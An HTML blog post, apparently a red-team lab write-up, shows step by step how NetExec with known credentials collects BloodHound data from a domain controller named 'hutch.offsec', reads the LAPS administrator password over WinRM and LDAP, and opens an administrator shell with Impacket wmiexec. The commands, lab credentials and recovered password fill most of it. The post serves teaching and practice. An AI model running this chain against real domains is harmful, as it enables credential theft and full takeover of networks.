@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>Practical NetExec for BloodHound Collectors and LAPS Abuse // byt3n33dl3</title>
+    <link rel="icon" type="image/png" href="../images/logo.png">
+    <link rel="stylesheet" href="../theme/css/pure.css">
+    <link rel="stylesheet" href="../theme/css/styles.css">
+    <link rel="stylesheet" href="../theme/css/pygments.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+</head>
+<body>
+<div class="pure-g-r" id="layout">
+    <div class="sidebar pure-u">
+        <div class="cover-img"></div>
+        <div class="cover-body">
+            <header class="header">
+                <hgroup>
+                    <h1 class="brand-main"><a href="../index.html">AdverXarial</a></h1>
+                    <p class="tagline">Red Team // Adversary Emulator // Maintained by byt3n33dl3</p>
+                    <p class="links">
+                        <a href="../pages/about.html">About</a>
+                        <a href="https://byt3n33dl3.substack.com/">Archives</a>
+                    </p>
+                    <p class="social">
+                        <a href="https://github.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/github.svg" width="20" height="20" alt="GitHub">
+                        </a>
+                        <a href="#">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/linkedin.svg" width="20" height="20" alt="LinkedIn">
+                        </a>
+                        <a href="https://x.com/byt3n33dl3/">
+                            <img src="https://cdn.jsdelivr.net/npm/simple-icons@v3/icons/twitter.svg" width="20" height="20" alt="Twitter">
+                        </a>
+                    </p>
+                </hgroup>
+            </header>
+        </div>
+    </div>
+
+    <div class="pure-u">
+        <div class="content">
+            <div class="post-header">
+                <img src="../images/logo.png" alt="avatar" class="post-avatar">
+                <div class="post-meta-wrapper">
+                    <h2 class="post-author"><a href="../pages/byt3n33dl3.html">byt3n33dl3</a></h2>
+                    <p class="post-date">Published Mon 18 Nov 2024</p>
+                </div>
+            </div>
+
+            <p class="back-link"><a href="../index.html">← Home</a></p>
+
+            <article class="post-content">
+                <h1>Practical NetExec for BloodHound Collectors and LAPS Abuse</h1>
+                <p class="post-tags">Tags: <a href="#">Red Teaming</a> · <a href="#">Active Directory</a> · <a href="#">NetExec</a> · <a href="#">LAPS</a></p>
+
+                <p class="post-meta">Blog released: 2024 Mon 18 Nov.</p>
+
+                <h1>LAPS Abuse Overview</h1>
+                
+                <p>If LAPS is used inside the domain, it can be hard to use <a href="https://www.netexec.wiki/"><ins>NetExec tool</ins></a> to execute a command on every computer on the domain.</p> 
+                
+                <p>Therefore, a new core option has been added <code>--laps</code> If you have compromised an account that can read LAPS password, you can use NetExec like this</p>
+
+                <p><ins>PS:</ins> This method are only works for NetExec in WinRM sessions, as example:</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc winrm hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 --laps
+WINRM       192.168.157.182 5985   HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+WINRM       192.168.157.182 5985   HUTCHDC          [-] HUTCHDC\administrator:Ut!DW@Y/2idX</code></pre>
+
+                <p>Let's move back-wards litle bit from Red teaming first instinct when having set credentials of:</p>
+
+                <p><code>fmcsorley:CrabSharkJellyfish192</code></p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap hutch.offsec -u fmcsorley -p CrabSharkJellyfish192
+LDAP        192.168.157.182 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        192.168.157.182 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192</code></pre>
+
+                <p>Lists of idea in mind (more or less):</p>
+
+                <ul>
+                    <li>Roasting.</li>
+                    <li>BloodHound collectors.</li>
+                </ul>
+
+                <p>Long-story short BloodHound are very important so let's use NetExec as collectors.</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap HUTCHDC.hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 --bloodhound -c All --dns-server 192.168.157.182
+LDAP        192.168.157.182 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        192.168.157.182 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+LDAP        192.168.157.182 389    HUTCHDC          Resolved collection methods: trusts, dcom, group, objectprops, psremote, localadmin, session, rdp, acl, container
+LDAP        192.168.157.182 389    HUTCHDC          Done in 00M 04S
+LDAP        192.168.157.182 389    HUTCHDC          Compressing output into /root/.nxc/logs/HUTCHDC_192.168.157.182_2024-10-18_163030_bloodhound.zip</code></pre>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ ls
+HUTCHDC_192.168.157.182_2024-10-18_163030_bloodhound.zip</code></pre>
+
+                <p>From here the <code>.zip</code> files would be containing <code>.JSON</code> more or less like <a href="https://github.com/dirkjanm/BloodHound.py/"><ins>BloodHound Python,</ins></a> whatever it is as long we can fed it to BloodHound graph.</p>
+
+                <div class="video-container">
+                <img alt="netexec-usage-practical" width="100%" src="../images/netexec-usage-bloodhound-laps-graph.jpeg"></iframe>
+                </div>
+
+                <p>Here at the BloodHound graph we're able to see that our currect owned User can read Password LAPS from HUTCHDC computer.</p>
+                
+                <p>From that singular information we can now add commands on NetExec, we can read LAPS password from multiple sectors:</p>
+
+                <ul>
+                    <li>WinRM via: <code>--laps</code> command</li>
+                    <li>LDAP via laps Module</li>
+                </ul>
+
+                <p>This is moreover preferences, if WinRM indicate success, it can also indicate what user LAPS password belong to (following the example above).</p>
+                
+                <p>Let's now try with laps Module on NetExec with <code>-M</code> command.</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap hutch.offsec -u fmcsorley -p CrabSharkJellyfish192 -M laps
+LDAP        192.168.157.182 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        192.168.157.182 389    HUTCHDC          [+] hutch.offsec\fmcsorley:CrabSharkJellyfish192 
+LAPS        192.168.157.182 389    HUTCHDC          [*] Getting LAPS Passwords
+LAPS        192.168.157.182 389    HUTCHDC          Computer:HUTCHDC$ User:                Password:Ut!DW@Y/2idX</code></pre>
+
+                <p>Whatever protocol it is, we're as Adversary have successfully retrieve the LAPS password and do lateral-movement.</p>
+                
+                <p>Validating</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ nxc ldap hutch.offsec -u Administrator -p 'Ut!DW@Y/2idX'         
+LDAP        192.168.157.182 389    HUTCHDC          [*] Windows 10 / Server 2019 Build 17763 (name:HUTCHDC) (domain:hutch.offsec)
+LDAP        192.168.157.182 389    HUTCHDC          [+] hutch.offsec\Administrator:Ut!DW@Y/2idX (Pwn3d!)</code></pre>
+
+                <p>We got Pwned!! yo, now supposed we Logon</p>
+
+                <pre><code class="language-plaintext">┌──(kali㉿kali)-[~]
+└─$ wmiexec.py Administrator:'Ut!DW@Y/2idX'@hutch.offsec                                                           
+Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+hutch\administrator</code></pre>
+
+                <p>Moreover <a href="mailto:byt3n33dl3@pm.me"><ins>Proton me</ins></a> if you have further question and suggestion.</p>
+
+                <p>Happy hacking!</p>
+                
+                <p class="go-top"><a href="#">Go Top</a></p>
+            </article>
+
+            <footer class="footer">
+                <p>&copy; byt3n33dl3 2024 · Built with blood, sweat, and HTML · <a href="../pages/all.atom.xml">RSS</a></p>
+            </footer>
+        </div>
+    </div>
+</div>
+</body>
+</html>
